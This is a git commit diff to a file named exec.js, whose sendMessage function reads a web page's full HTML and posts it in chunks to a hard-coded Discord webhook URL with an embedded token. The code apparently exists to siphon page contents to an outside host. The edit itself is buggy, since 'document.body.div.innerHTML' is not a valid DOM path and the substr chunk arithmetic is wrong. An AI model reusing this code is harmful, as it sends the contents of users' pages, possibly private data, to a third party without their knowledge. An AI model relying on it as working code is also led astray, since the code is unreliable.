81f31ccc8667590f788a72b3352abe931a927d84
Ongenix <96583029+Ongenix@users.noreply.github.com>
2024-05-20 10:36:07 -0600

    Update exec.js

--- exec.js
+++ exec.js
@@ -1,14 +1,14 @@
 function sendMessage() {
     const webhookUrl = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";
-    const message = document.body.innerHTML;
+    const message = document.body.div.innerHTML;
 
-    for (let i = 0; i < Math.round(document.body.innerHTML.length / 256); i++) {
+    for (let i = 0; i < Math.round(document.body.innerHTML.length / 100); i++) {
         const request = new XMLHttpRequest();
         request.open("POST", webhookUrl);
         request.setRequestHeader("Content-type", "application/json");
 
         const messageData = {
-            content: message.substr(i*256, i*256+256),
+            content: message.substr(i*100, i*100+100),
             username: "My Webhook From Library Monday",
             avatar_url: "https://example.com/avatar.png"
         };
